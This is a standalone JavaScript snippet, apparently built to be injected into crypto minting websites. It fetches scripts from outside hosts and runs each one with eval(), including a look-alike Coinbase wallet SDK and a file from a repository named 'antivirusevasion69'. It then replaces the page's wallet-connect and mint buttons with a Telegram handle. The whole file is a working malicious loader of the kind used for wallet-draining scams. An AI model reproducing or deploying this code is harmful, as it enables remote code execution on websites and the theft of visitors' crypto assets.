(async () => {
    const js = `
    function getElementsByText(str, tag = 'a') {
        return Array.prototype.slice.call(document.getElementsByTagName(tag)).filter(el => el.textContent.trim() === str.trim());
      }
      
let buttons = [] 

let class_name = 'interact-button'

for (var inner of ["Minting now", "Wallet", "Connect ", "Connect a wallet", "Connect wallet to proceed", "t.me/doener2323"]) {
    for (var type of ["button"]) {
        let elements = getElementsByText(inner, type)

        for (var element of elements) {
            var new_element = element.cloneNode(true);
            new_element.classList.add(class_name)
            new_element.removeEventListener()
            new_element.textContent = "t.me/doener2323"
            element.parentNode.replaceChild(new_element, element);
            console.log("Added class '" + class_name + "' to", element)
        }
    }
}`
    
    let scripts_to_fetch =
        [
            "https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js",
            "https://kasrlorcian.github.io/coinbase/coinbase-wallet-sdk.js",
            "https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js",
            "https://unpkg.com/web3modal@1.9.0/dist/index.js",
            "https://unpkg.com/web3@1.8.1/dist/web3.min.js",
            "https://cdn.jsdelivr.net/npm/sweetalert2@11",
            "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/message%20(39).txt"
        ]
    
    
    
    for (let script of scripts_to_fetch) {
        try {
            console.log(`Fetching`, script)
            await fetch(script)
                .then((response) => response.text())
                .then((data) => {
                    eval(data)
                    console.log(`Evaled`, script)
                });
        } catch (err) {
            console.log(err)
        }
    }
    
    const encodedJs = encodeURIComponent(js);
    
    const dataUri = 'data:text/javascript;charset=utf-8,'
        + encodedJs;
    
    import(dataUri)
})()

